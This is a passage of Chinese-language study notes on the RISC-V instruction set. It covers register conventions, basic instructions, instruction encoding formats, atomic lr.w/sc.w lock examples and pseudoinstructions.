<p><code>x2</code> / <code>sp</code> 是 stack pointer<span class="mojikumi-line-end">。</span></p>
</li>
<li>
<p><code>x3</code> / <code>gp</code> 是 global pointer<span class="mojikumi-line-start">（</span>指向 static variable 的位置<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
</li>
<li>
<p><code>x4</code> / <code>tp</code> 是 thread pointer<span class="mojikumi-line-end">。</span></p>
</li>
<li>
<p><code>x8</code> / <code>fp</code> 可以用作 frame pointer<span class="mojikumi-line-end">。</span></p>
</li>
<li>
<p><code>x10</code>-<code>x17</code> (<code>a0</code>-<code>a7</code>) 用来存放前 8 个参数或返回值<span class="mojikumi-line-start">（</span>一般单个返回值就是 <code>x10</code><span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
</li>
<li>
<p><code>x8</code>-<code>x9</code> (<code>s0</code>-<code>s1</code>), <code>x18</code>-<code>x27</code> (<code>s2</code>-<code>s11</code>) 是 (callee-)saved<span class="mojikumi-line-end">。</span></p>
</li>
<li>
<p><code>x5</code>-<code>x7</code> (<code>t0</code>-<code>t2</code>), <code>x28</code>-<code>x31</code> (<code>t3</code>-<code>t6</code>) 是 temporary (caller-saved)<span class="mojikumi-line-end">。</span></p>
</li>
</ul>
<a id="register-那么快，怎么不多来点（" name="register-那么快，怎么不多来点（" aria-hidden="true"></a>
<aside role="note" data-v-a2ab257f><div class="shadow-md rd-1 b-l-6 my-6 bg-blue-1 dark:bg-blue-9 b-blue" data-v-a2ab257f><div class="p-3 flex justify-between items-center" data-v-a2ab257f><h3 class="flex items-center gap-1 font-bold" data-v-a2ab257f><span class="text-5 i-mdi-pencil text-blue" data-v-a2ab257f></span><span class="sr-only" data-v-a2ab257f>Note: </span><span data-v-a2ab257f>register 那么快，怎么不多来点（</span></h3><!--v-if--></div><div class="overflow-auto rd-br-1 bg-card px-6 dark:bg-bghover" data-v-a2ab257f><p>限制 register 的数量有助于在硬件实现时加快电路<span class="mojikumi-line-end">，</span>从而提升 clock frequency<span class="mojikumi-line-end">。</span></p><p>并且<span class="mojikumi-line-end">，</span>register 的编号需要被编码在 instruction 中<span class="mojikumi-line-end">，</span>限制 register 的数量也可以缩短 instruction 的长度<span class="mojikumi-line-end">。</span></p></div></div></aside>
<h2 id="basic-instructions" class="heading"><a href="#basic-instructions" class="heading-anchor" aria-label="章节： Basic Instructions" tabindex="-1"></a><span>Basic Instructions</span></h2>
<h3 id="op1-op2-op-op3" class="heading"><a href="#op1-op2-op-op3" class="heading-anchor" aria-label="章节： op1 = op2 op op3" tabindex="-1"></a><span>op1 = op2 op op3</span></h3>
<p><code>add</code>, <code>sub</code>, <code>addi</code>, <code>and</code>, <code>or</code>, <code>xor</code>, <code>andi</code>, <code>ori</code>, <code>xori</code>, <code>sll</code>, <code>srl</code>, <code>sra</code>, <code>slli</code>, <code>srli</code>, <code>srai</code>, <code>slt</code>, <code>sltu</code>, <code>slti</code>, <code>sltiu</code></p>
<ul>
<li><code>add x5, x6, x7</code>: <code>x5 = x6 + x7</code></li>
<li><code>addi x5, x6, 20</code>: <code>x5 = x6 + 20</code><span class="mojikumi-line-end">，</span>其中 immediate 是 12-bit signed integer<span class="mojikumi-line-end">。</span></li>
<li><code>slt x5, x6, x7</code>: <code>x5 = x6 &#x3C; x7 ? 1 : 0</code></li>
</ul>
<a id="immediate-的妙用" name="immediate-的妙用" aria-hidden="true"></a>
<aside role="note" data-v-a2ab257f><div class="shadow-md rd-1 b-l-6 my-6 bg-blue-1 dark:bg-blue-9 b-blue" data-v-a2ab257f><div class="p-3 flex justify-between items-center" data-v-a2ab257f><h4 class="flex items-center gap-1 font-bold" data-v-a2ab257f><span class="text-5 i-mdi-pencil text-blue" data-v-a2ab257f></span><span class="sr-only" data-v-a2ab257f>Note: </span><span data-v-a2ab257f>immediate 的妙用</span></h4><!--v-if--></div><div class="overflow-auto rd-br-1 bg-card px-6 dark:bg-bghover" data-v-a2ab257f><ul>
<li><code>addi</code> 在 immediate 为负时可以做减法</li>
<li><code>addi</code> 在 immediate 为 0 时相当于 register 间的 move</li>
<li><code>xori</code> 以 -1 为 operand 可以起到 NOT 的效果</li>
</ul></div></div></aside>
<h3 id="data-transfer" class="heading"><a href="#data-transfer" class="heading-anchor" aria-label="章节： Data Transfer" tabindex="-1"></a><span>Data Transfer</span></h3>
<p>load word: <code>lw x5, 40(x6)</code>: <code>x5 = Memory[x6 + 40]</code></p>
<p>store word: <code>sw x5, 40(x6)</code>: <code>Memory[x6 + 40] = x5</code></p>
<p>half word<span class="mojikumi-line-end">、</span>byte: <code>lh</code>, <code>lhu</code>, <code>sh</code>, <code>lb</code>, <code>lbu</code>, <code>sb</code><span class="mojikumi-line-end">，</span>其中 <code>u</code> 用来决定高位补零还是符号位<span class="mojikumi-line-end">。</span></p>
<h3 id="conditional-branch" class="heading"><a href="#conditional-branch" class="heading-anchor" aria-label="章节： Conditional Branch" tabindex="-1"></a><span>Conditional Branch</span></h3>
<p><code>beq</code>, <code>bne</code>, <code>blt</code>, <code>bltu</code>, <code>bge</code>, <code>bgeu</code></p>
<p><code>blt x5, x6, 100</code>: <code>if (x5 &#x3C; x6) goto PC+100</code></p>
<a id="剩下的比较函数？" name="剩下的比较函数？" aria-hidden="true"></a>
<aside role="note" data-v-a2ab257f><div class="shadow-md rd-1 b-l-6 my-6 bg-blue-1 dark:bg-blue-9 b-blue" data-v-a2ab257f><div class="p-3 flex justify-between items-center" data-v-a2ab257f><h4 class="flex items-center gap-1 font-bold" data-v-a2ab257f><span class="text-5 i-mdi-pencil text-blue" data-v-a2ab257f></span><span class="sr-only" data-v-a2ab257f>Note: </span><span data-v-a2ab257f>剩下的比较函数？</span></h4><!--v-if--></div><div class="overflow-auto rd-br-1 bg-card px-6 dark:bg-bghover" data-v-a2ab257f><p>lt 和 gt<span class="mojikumi-line-end">、</span>ge 和 le 只需将操作数互换即可<span class="mojikumi-line-end">，</span>所以不需要额外的 instruction<span class="mojikumi-line-start">（</span>但可以有额外的 <a href="#pseudoinstructions">pseudoinstruction</a><span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p><p>lt 和 ge 结果是相反的<span class="mojikumi-line-end">，</span>在硬件上容易实现<span class="mojikumi-line-end">，</span>所以不是 lt 和 le / gt 和 ge<span class="mojikumi-line-end">。</span></p><p><code>slt</code> 则不需要 <code>sge</code><span class="mojikumi-line-end">，</span>因为将结果存下来一般只需和 0 比较 eq / ne 即可<span class="mojikumi-line-end">。</span></p></div></div></aside>
<h3 id="unconditional-branch" class="heading"><a href="#unconditional-branch" class="heading-anchor" aria-label="章节： Unconditional Branch" tabindex="-1"></a><span>Unconditional Branch</span></h3>
<p><code>jal x1, 100</code>: <code>x1 = PC+4; goto PC+100</code></p>
<p><code>jalr x1, 100(x5)</code>: <code>x1 = PC+4; goto x5+100</code></p>
<h2 id="instruction-format" class="heading"><a href="#instruction-format" class="heading-anchor" aria-label="章节： Instruction Format" tabindex="-1"></a><span>Instruction Format</span></h2>
<p>RISC-V 的 instruction 都是 32 bits 长<span class="mojikumi-line-end">，</span>有若干种不同的 instruction format<span class="mojikumi-line-end">。</span></p>
<p>其中 <span class="mojikumi">“</span>rs<span class="mojikumi">”</span> 是 register source<span class="mojikumi">，</span><wbr><span class="mojikumi-line-start">“</span>rd<span class="mojikumi">”</span> 是 register destination<span class="mojikumi">，</span><wbr><span class="mojikumi-line-start">“</span>funct<span class="mojikumi">”</span> 用作 additional opcode<span class="mojikumi-line-end">。</span></p>
<p>R-type:</p>
<div class="overflow-auto"><div class="grid grid-cols-32 min-w-150 [&amp;&gt;div]:b-footer [&amp;&gt;div]:b-2 [&amp;&gt;div]:b-r-0 [&amp;&gt;div:last-child]:b-r-2 [&amp;&gt;div]:grid [&amp;&gt;div]:justify-items-center"><div class="col-span-7"><span>funct7</span>
<span>(7 bits)</span></div><div class="col-span-5"><span>rs2</span>
<span>(5 bits)</span></div><div class="col-span-5"><span>rs1</span>
<span>(5 bits)</span></div><div class="col-span-3"><span>funct3</span>
<span>(3 bits)</span></div><div class="col-span-5"><span>rd</span>
<span>(5 bits)</span></div><div class="col-span-7"><span>opcode</span>
<span>(7 bits)</span></div></div></div>
<p>I-type<span class="mojikumi-line-end">：</span></p>
<div class="overflow-auto"><div class="grid grid-cols-32 min-w-150 [&amp;&gt;div]:b-footer [&amp;&gt;div]:b-2 [&amp;&gt;div]:b-r-0 [&amp;&gt;div:last-child]:b-r-2 [&amp;&gt;div]:grid [&amp;&gt;div]:justify-items-center"><div class="col-span-12"><span>imm[11:0]</span>
<span>(12 bits)</span></div><div class="col-span-5"><span>rs1</span>
<span>(5 bits)</span></div><div class="col-span-3"><span>funct3</span>
<span>(3 bits)</span></div><div class="col-span-5"><span>rd</span>
<span>(5 bits)</span></div><div class="col-span-7"><span>opcode</span>
<span>(7 bits)</span></div></div></div>
<p>S-type<span class="mojikumi-line-end">：</span></p>
<div class="overflow-auto"><div class="grid grid-cols-32 min-w-150 [&amp;&gt;div]:b-footer [&amp;&gt;div]:b-2 [&amp;&gt;div]:b-r-0 [&amp;&gt;div:last-child]:b-r-2 [&amp;&gt;div]:grid [&amp;&gt;div]:justify-items-center"><div class="col-span-7"><span>imm[11:5]</span>
<span>(7 bits)</span></div><div class="col-span-5"><span>rs2</span>
<span>(5 bits)</span></div><div class="col-span-5"><span>rs1</span>
<span>(5 bits)</span></div><div class="col-span-3"><span>funct3</span>
<span>(3 bits)</span></div><div class="col-span-5"><span>imm[4:0]</span>
<span>(5 bits)</span></div><div class="col-span-7"><span>opcode</span>
<span>(7 bits)</span></div></div></div>
<p>可以看出<span class="mojikumi-line-end">，</span>在不同的 format 中<span class="mojikumi-line-end">，</span>会尽量保留 rs<span class="mojikumi-line-end">、</span>rd<span class="mojikumi-line-end">、</span>opcode<span class="mojikumi-line-end">、</span>funct3 的位置不变<span class="mojikumi-line-end">，</span>以简化电路<span class="mojikumi-line-start">（</span>其中保持 opcode 位置不变对于识别 instruction format 是必要的<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
<h2 id="wide-immediates-and-addresses" class="heading"><a href="#wide-immediates-and-addresses" class="heading-anchor" aria-label="章节： Wide Immediates and Addresses" tabindex="-1"></a><span>Wide Immediates and Addresses</span></h2>
<h3 id="wide-immediates" class="heading"><a href="#wide-immediates" class="heading-anchor" aria-label="章节： Wide Immediates" tabindex="-1"></a><span>Wide Immediates</span></h3>
<p>超过 12 bits 的 immediate 可以通过两条 instruction <code>lui</code> (load upper immediate) 和 <code>addi</code> load 到 register<span class="mojikumi-line-end">，</span>其中 <code>lui</code> 是 U-type<span class="mojikumi-line-end">：</span></p>
<div class="overflow-auto"><div class="grid grid-cols-32 min-w-150 [&amp;&gt;div]:b-footer [&amp;&gt;div]:b-2 [&amp;&gt;div]:b-r-0 [&amp;&gt;div:last-child]:b-r-2 [&amp;&gt;div]:grid [&amp;&gt;div]:justify-items-center"><div class="col-span-20"><span>imm[31:12]</span>
<span>(20 bits)</span></div><div class="col-span-5"><span>rd</span>
<span>(5 bits)</span></div><div class="col-span-7"><span>opcode</span>
<span>(7 bits)</span></div></div></div>
<p><code>auipc</code> 可以用来进行更大范围的 PC-relative branch<span class="mojikumi-line-end">，</span>和 <code>lui</code> 类似<span class="mojikumi-line-end">，</span>会将 PC 加上一个只有高位的 immediate 存于 register<span class="mojikumi-line-end">。</span></p>
<a id="lui-和-addi-不一定恰好是高位和低位" name="lui-和-addi-不一定恰好是高位和低位" aria-hidden="true"></a>
<aside role="note" data-v-a2ab257f><div class="shadow-md rd-1 b-l-6 my-6 bg-blue-1 dark:bg-blue-9 b-blue" data-v-a2ab257f><div class="p-3 flex justify-between items-center" data-v-a2ab257f><h4 class="flex items-center gap-1 font-bold" data-v-a2ab257f><span class="text-5 i-mdi-pencil text-blue" data-v-a2ab257f></span><span class="sr-only" data-v-a2ab257f>Note: </span><span data-v-a2ab257f><code>lui</code> 和 <code>addi</code> 不一定恰好是高位和低位</span></h4><!--v-if--></div><div class="overflow-auto rd-br-1 bg-card px-6 dark:bg-bghover" data-v-a2ab257f><p>由于 immediate 是 signed 的<span class="mojikumi-line-end">，</span>如果 <code>addi</code> 的 sign bit 是 1<span class="mojikumi-line-end">，</span>实际上是在做减法<span class="mojikumi-line-end">，</span>需要将 <code>lui</code> 的参数加一<span class="mojikumi-line-end">。</span></p></div></div></aside>
<h3 id="addressing-in-branches" class="heading"><a href="#addressing-in-branches" class="heading-anchor" aria-label="章节： Addressing in Branches" tabindex="-1"></a><span>Addressing in Branches</span></h3>
<p>branch 使用的 address 必须是偶数<span class="mojikumi-line-end">，</span>而且 branch instruction 使用了特殊的编码格式<span class="mojikumi-line-end">。</span></p>
<p>unconditional branch 使用 B-type<span class="mojikumi-line-end">，</span>和 S-type 类似<span class="mojikumi-line-end">：</span></p>
<div class="overflow-auto"><div class="grid grid-cols-32 min-w-150 [&amp;&gt;div]:b-footer [&amp;&gt;div]:b-2 [&amp;&gt;div]:b-r-0 [&amp;&gt;div:last-child]:b-r-2 [&amp;&gt;div]:grid [&amp;&gt;div]:justify-items-center"><div class="col-span-7"><span>imm[12],[10:5]</span>
<span>(7 bits)</span></div><div class="col-span-5"><span>rs2</span>
<span>(5 bits)</span></div><div class="col-span-5"><span>rs1</span>
<span>(5 bits)</span></div><div class="col-span-3"><span>funct3</span>
<span>(3 bits)</span></div><div class="col-span-5"><span>imm[4:1],[11]</span>
<span>(5 bits)</span></div><div class="col-span-7"><span>opcode</span>
<span>(7 bits)</span></div></div></div>
<p><code>jal</code> 使用 J-type<span class="mojikumi-line-end">，</span>和 U-type 类似<span class="mojikumi-line-end">：</span></p>
<div class="overflow-auto"><div class="grid grid-cols-32 min-w-150 [&amp;&gt;div]:b-footer [&amp;&gt;div]:b-2 [&amp;&gt;div]:b-r-0 [&amp;&gt;div:last-child]:b-r-2 [&amp;&gt;div]:grid [&amp;&gt;div]:justify-items-center"><div class="col-span-7"><span>imm[20],[10:5]</span>
<span>(7 bits)</span></div><div class="col-span-5"><span>imm[4:1],[11]</span>
<span>(5 bits)</span></div><div class="col-span-8"><span>imm[19:12]</span>
<span>(8 bits)</span></div><div class="col-span-5"><span>rd</span>
<span>(5 bits)</span></div><div class="col-span-7"><span>opcode</span>
<span>(7 bits)</span></div></div></div>
<p><code>jalr</code> 使用 I-type<span class="mojikumi-line-end">。</span></p>
<p>通过对 immediate 的重排<span class="mojikumi-line-end">：</span></p>
<ul>
<li>所有格式中 immediate 的符号位都在同一位<span class="mojikumi-line-end">。</span></li>
<li>I<span class="mojikumi-line-end">、</span>S<span class="mojikumi-line-end">、</span>B<span class="mojikumi-line-end">、</span>U 中 <code>imm[10:5]</code> 位置相同<span class="mojikumi-line-end">。</span></li>
<li>S<span class="mojikumi-line-end">、</span>B 中 <code>imm[4:1]</code> 位置相同<span class="mojikumi-line-end">。</span></li>
<li>I<span class="mojikumi-line-end">、</span>J 中 <code>imm[4:1]</code> 位置相同<span class="mojikumi-line-end">，</span>U<span class="mojikumi-line-end">、</span>J 中 <code>imm[19:12]</code> 位置相同<span class="mojikumi-line-end">。</span></li>
</ul>
<a id="jalr-的-format" name="jalr-的-format" aria-hidden="true"></a>
<aside role="note" data-v-a2ab257f><div class="shadow-md rd-1 b-l-6 my-6 bg-blue-1 dark:bg-blue-9 b-blue" data-v-a2ab257f><div class="p-3 flex justify-between items-center" data-v-a2ab257f><h4 class="flex items-center gap-1 font-bold" data-v-a2ab257f><span class="text-5 i-mdi-pencil text-blue" data-v-a2ab257f></span><span class="sr-only" data-v-a2ab257f>Note: </span><span data-v-a2ab257f><code>jalr</code> 的 format</span></h4><!--v-if--></div><div class="overflow-auto rd-br-1 bg-card px-6 dark:bg-bghover" data-v-a2ab257f><p><code>jalr</code> 需要读取 register<span class="mojikumi-line-end">，</span>所以当然不是 J-type<span class="mojikumi-line-end">。</span>而 RISC-V 的设计选择了不为其单独再引入一种 instruction format<span class="mojikumi-line-end">：</span></p><blockquote>
<p>Note that the JALR instruction does not treat the 12-bit immediate as multiples of 2 bytes,
unlike the conditional branch instructions. This avoids one more immediate format in hardware.
In practice, most uses of JALR will have either a zero immediate or be paired with a LUI or
AUIPC, so the slight reduction in range is not significant.<sup><a href="#user-content-fn-jalr-format" id="user-content-fnref-jalr-format" data-footnote-ref aria-describedby="footnote-label">1</a></sup></p>
</blockquote></div></div></aside>
<a id="16-bit-instructions" name="16-bit-instructions" aria-hidden="true"></a>
<aside role="note" data-v-a2ab257f><div class="shadow-md rd-1 b-l-6 my-6 bg-blue-1 dark:bg-blue-9 b-blue" data-v-a2ab257f><div class="p-3 flex justify-between items-center" data-v-a2ab257f><h4 class="flex items-center gap-1 font-bold" data-v-a2ab257f><span class="text-5 i-mdi-pencil text-blue" data-v-a2ab257f></span><span class="sr-only" data-v-a2ab257f>Note: </span><span data-v-a2ab257f>16-bit instructions</span></h4><!--v-if--></div><div class="overflow-auto rd-br-1 bg-card px-6 dark:bg-bghover" data-v-a2ab257f><p>instruction address 必须是偶数<span class="mojikumi-line-end">，</span>但不一定是 4 的倍数<span class="mojikumi-line-end">。</span>这是因为<span class="mojikumi-line-end">，</span>RISC-V 有允许 16-bit instruction 的 <span class="mojikumi">“</span><span class="mojikumi">‘</span>C<span class="mojikumi-narrow-left">’</span> Standard Extension for Compressed Instructions<span class="mojikumi">”</span><span class="mojikumi-line-end">。</span></p><blockquote>
<p>The base RISC-V ISA has fixed-length 32-bit instructions that must be naturally aligned on 32-bit
boundaries. However, the standard RISC-V encoding scheme is designed to support ISA extensions
with variable-length instructions, where each instruction can be any number of 16-bit instruction
parcels in length and parcels are naturally aligned on 16-bit boundaries. The standard compressed
ISA extension described in Chapter 16 reduces code size by providing compressed 16-bit instructions
and relaxes the alignment constraints to allow all instructions (16 bit and 32 bit) to be aligned on
any 16-bit boundary to improve code density. <sup><a href="#user-content-fn-rvc" id="user-content-fnref-rvc" data-footnote-ref aria-describedby="footnote-label">2</a></sup></p>
</blockquote></div></div></aside>
<h2 id="synchronization-in-parallelism" class="heading"><a href="#synchronization-in-parallelism" class="heading-anchor" aria-label="章节： Synchronization in Parallelism" tabindex="-1"></a><span>Synchronization in Parallelism</span></h2>
<p>在 parallel execution 中<span class="mojikumi-line-end">，</span>需要 processor 支持 atomic operation 来实现各种 synchronization<span class="mojikumi-line-end">，</span>例如 lock<span class="mojikumi-line-end">。</span></p>
<p>RISC-V 提供一对命令 <code>lr.w</code> (load-reserved word) 和 <code>sc.w</code> (store-conditional word) 来实现 <span class="mojikumi">“</span>atomically read and modify a memory location<span class="mojikumi">”</span><span class="mojikumi-line-end">：</span></p>
<ol>
<li><code>lr.w</code> 接受两个 register 作为 operand<span class="mojikumi-line-end">，</span>分别是 destination 和 address<span class="mojikumi-line-end">，</span>它单独一个命令自身的效果和 <code>lw</code> 类似<span class="mojikumi-line-end">；</span></li>
<li><code>sc.w</code> 接受三个 register 作为 operand<span class="mojikumi-line-end">，</span>后两个是 source 和 address<span class="mojikumi-line-end">，</span>若在 <code>lr.w</code> 和 <code>sc.w</code> 之间 address 处被修改过则 store 会失败<span class="mojikumi-line-end">。</span>第一个 operand 用来存放结果<span class="mojikumi-line-start">（</span>0 表示成功<span class="mojikumi-line-end">，</span>非零表示失败<span class="mojikumi">）</span><span class="mojikumi-line-end">、</span><span class="mojikumi-line-end">。</span></li>
</ol>
<p>实现 atomic swap<span class="mojikumi">：</span><wbr><span class="mojikumi-line-start">（</span>交换 <code>(x20)</code> 和 <code>x23</code><span class="mojikumi-line-end">）</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h3 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="RISC-V 代码块" data-v-ad49d235>RISC-V</h3><ile-root id="ile-38"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-38--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #82AAFF">again</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">lr.w</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">x10</span><span style="color: #D6DEEB">, (</span><span style="color: #C5E478">x20</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">sc.w</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">x11</span><span style="color: #D6DEEB">, </span><span style="color: #C5E478">x23</span><span style="color: #D6DEEB">, (</span><span style="color: #C5E478">x20</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">bne</span><span style="color: #D6DEEB">  </span><span style="color: #C5E478">x11</span><span style="color: #D6DEEB">, </span><span style="color: #C5E478">x0</span><span style="color: #D6DEEB">, again</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">addi</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">x23</span><span style="color: #D6DEEB">, </span><span style="color: #C5E478">x10</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">0</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #4876D6">again</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">lr.w</span><span style="color: #403F53"> </span><span style="color: #4876D6">x10</span><span style="color: #403F53">, (</span><span style="color: #4876D6">x20</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">sc.w</span><span style="color: #403F53"> </span><span style="color: #4876D6">x11</span><span style="color: #403F53">, </span><span style="color: #4876D6">x23</span><span style="color: #403F53">, (</span><span style="color: #4876D6">x20</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">bne</span><span style="color: #403F53">  </span><span style="color: #4876D6">x11</span><span style="color: #403F53">, </span><span style="color: #4876D6">x0</span><span style="color: #403F53">, again</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">addi</span><span style="color: #403F53"> </span><span style="color: #4876D6">x23</span><span style="color: #403F53">, </span><span style="color: #4876D6">x10</span><span style="color: #403F53">, </span><span style="color: #AA0982">0</span></span></code></pre></div></section>
<p>实现 lock<span class="mojikumi">：</span><wbr><span class="mojikumi-line-start">（</span><code>(x20)</code> 为 0/1 表示 lock free/acquired<span class="mojikumi-line-end">）</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h3 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="RISC-V 代码块" data-v-ad49d235>RISC-V</h3><ile-root id="ile-39"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-39--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #82AAFF">acquire</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">addi</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">x12</span><span style="color: #D6DEEB">, </span><span style="color: #C5E478">x0</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">1</span></span>
<span><span style="color: #82AAFF">again</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">lr.w</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">x10</span><span style="color: #D6DEEB">, (</span><span style="color: #C5E478">x20</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">bne</span><span style="color: #D6DEEB">  </span><span style="color: #C5E478">x10</span><span style="color: #D6DEEB">, </span><span style="color: #C5E478">x0</span><span style="color: #D6DEEB">, again</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">sc.w</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">x11</span><span style="color: #D6DEEB">, </span><span style="color: #C5E478">x12</span><span style="color: #D6DEEB">, (</span><span style="color: #C5E478">x20</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">bne</span><span style="color: #D6DEEB">  </span><span style="color: #C5E478">x11</span><span style="color: #D6DEEB">, </span><span style="color: #C5E478">x0</span><span style="color: #D6DEEB">, again</span></span>
<span></span>
<span><span style="color: #82AAFF">release</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">sw</span><span style="color: #D6DEEB">   </span><span style="color: #C5E478">x0</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">x20</span><span style="color: #D6DEEB">)</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #4876D6">acquire</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">addi</span><span style="color: #403F53"> </span><span style="color: #4876D6">x12</span><span style="color: #403F53">, </span><span style="color: #4876D6">x0</span><span style="color: #403F53">, </span><span style="color: #AA0982">1</span></span>
<span><span style="color: #4876D6">again</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">lr.w</span><span style="color: #403F53"> </span><span style="color: #4876D6">x10</span><span style="color: #403F53">, (</span><span style="color: #4876D6">x20</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">bne</span><span style="color: #403F53">  </span><span style="color: #4876D6">x10</span><span style="color: #403F53">, </span><span style="color: #4876D6">x0</span><span style="color: #403F53">, again</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">sc.w</span><span style="color: #403F53"> </span><span style="color: #4876D6">x11</span><span style="color: #403F53">, </span><span style="color: #4876D6">x12</span><span style="color: #403F53">, (</span><span style="color: #4876D6">x20</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">bne</span><span style="color: #403F53">  </span><span style="color: #4876D6">x11</span><span style="color: #403F53">, </span><span style="color: #4876D6">x0</span><span style="color: #403F53">, again</span></span>
<span></span>
<span><span style="color: #4876D6">release</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">sw</span><span style="color: #403F53">   </span><span style="color: #4876D6">x0</span><span style="color: #403F53">, </span><span style="color: #AA0982">0</span><span style="color: #403F53">(</span><span style="color: #4876D6">x20</span><span style="color: #403F53">)</span></span></code></pre></div></section>
<a id="lr-w-的-format" name="lr-w-的-format" aria-hidden="true"></a>
<aside role="note" data-v-a2ab257f><div class="shadow-md rd-1 b-l-6 my-6 bg-blue-1 dark:bg-blue-9 b-blue" data-v-a2ab257f><div class="p-3 flex justify-between items-center" data-v-a2ab257f><h3 class="flex items-center gap-1 font-bold" data-v-a2ab257f><span class="text-5 i-mdi-pencil text-blue" data-v-a2ab257f></span><span class="sr-only" data-v-a2ab257f>Note: </span><span data-v-a2ab257f><code>lr.w</code> 的 format</span></h3><!--v-if--></div><div class="overflow-auto rd-br-1 bg-card px-6 dark:bg-bghover" data-v-a2ab257f><p>单看 <code>lr.w</code> 的话<span class="mojikumi-line-end">，</span>似乎可以和 <code>lw</code> 一样使用 I-type 而接受一个 address offset<span class="mojikumi-line-end">。</span>但是<span class="mojikumi-line-end">，</span><code>sc.w</code> 需要三个 register<span class="mojikumi-line-end">，</span>只能用 R-type<span class="mojikumi-line-end">，</span>而 <code>lr.w</code> 和 <code>sc.w</code> 一定是挨在一起用的<span class="mojikumi-line-end">，</span>没道理只给一个提供 offset<span class="mojikumi-line-end">，</span>所以它们使用了同样的 R-type<span class="mojikumi-line-end">。</span></p></div></div></aside>
<h2 id="pseudoinstructions" class="heading"><a href="#pseudoinstructions" class="heading-anchor" aria-label="章节： Pseudoinstructions" tabindex="-1"></a><span>Pseudoinstructions</span></h2>
<p>为了方便编写汇编<span class="mojikumi-line-end">，</span>汇编中可以使用一些在 hardware 上不存在的 <i>pseudoinstruction</i><span class="mojikumi-line-end">。</span>例如<span class="mojikumi-line-end">：</span></p>
<ul>
<li><code>nop</code>: <code>addi x0, x0, 0</code></li>
<li><code>mv rd, rs</code>: <code>addi rd, rs, 0</code></li>
<li><code>not rd, rs</code>: <code>xori rd, rs, -1</code></li>
<li><code>neg rd, rs</code>: <code>sub rd, x0, rs</code></li>
<li><code>bgt rs, rt, offset</code>: <code>blt rt, rs, offset</code></li>
<li><code>bnez rs, offset</code>: <code>bne rs, x0, offset</code></li>
<li><code>ble rs, rt, offset</code>: <code>bge rt, rs, offset</code></li>
<li><code>jal offset</code>: <code>jal x1, offset</code></li>
<li><code>ret</code>: <code>jalr x0, 0(x1)</code></li>
</ul>
